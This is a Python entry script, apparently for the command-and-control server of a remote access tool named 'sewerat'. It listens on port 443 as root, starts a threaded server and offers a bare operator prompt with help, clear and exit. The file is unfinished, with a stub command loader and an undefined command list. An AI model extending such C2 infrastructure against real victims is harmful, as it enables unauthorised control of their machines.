import threading
from colorama import Fore, Style
from secrets import choice
# Changed to use simpler Python implementation for now.
from src.server import ThreadedServer, RequestHandler
from sys import stderr
import argparse
import os

colors = [Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTRED_EX]

def get_args():
  parser = argparse.ArgumentParser(description="A C2 server for sewerat.", prog="seweratc2")
  parser.add_argument("host", help="The IP address to listen on", metavar="[HOST]", default="0.0.0.0", nargs='?')
  parser.add_argument("port", help="The port to listen on.", metavar="[PORT]", default=443, action="store", nargs='?')
  
  args = parser.parse_args()
  
  host = args.host
  port = args.port
  
  return (host, port)
  
# check for root perms
def check_root():
    if os.getuid() != 0:
        stderr.write(f"{colors[2]}Error: Please run the script as root!\n")
        exit(-1)

# print a random ascii logo on the screen
def show_ascii_logo():
    cpath = os.getcwd()
    lpath = "/logos/"
    # choose a random logo
    logopath = cpath + lpath + choice(os.listdir(cpath + lpath))
    # print logo if paths exists
    if os.path.exists(logopath):
        with open(logopath, "r") as f:
            print(colors[1] + f.read() + Style.RESET_ALL)
            return None
    # write error to stderr
    stderr.write(f"{colors[2]}Error: Logo not found.\n")

def load_commands():
  pass

def main():  
    # Check for uid=0
    check_root()
    
    host, port = get_args()
    port = int(port)
        
    with ThreadedServer((host, port), RequestHandler) as server:
      ip, port = server.server_address
      # Starts a 2nd thread for the server, which starts a thread per request.
      # This is perfect for a C2 server in terms of scaling.
      server_thread = threading.Thread(target=server.serve_forever)
      # Exit when main thread does
      server_thread.daemon = True
      server_thread.start()
      
      show_ascii_logo()
    
      print(f"{colors[1]}Starting server on: {host}:{port}")
      print("Server started!")
      
      while True:
        command = input("sewerat > ").strip()

        
        if command == "help":
          print("== HELP ==")
          for cmd in cmds:
            print(cmd)
            
        elif command == "clear":
          os.system("clear")
        elif command == "exit":
          exit(0)

if __name__ == "__main__":
    main()
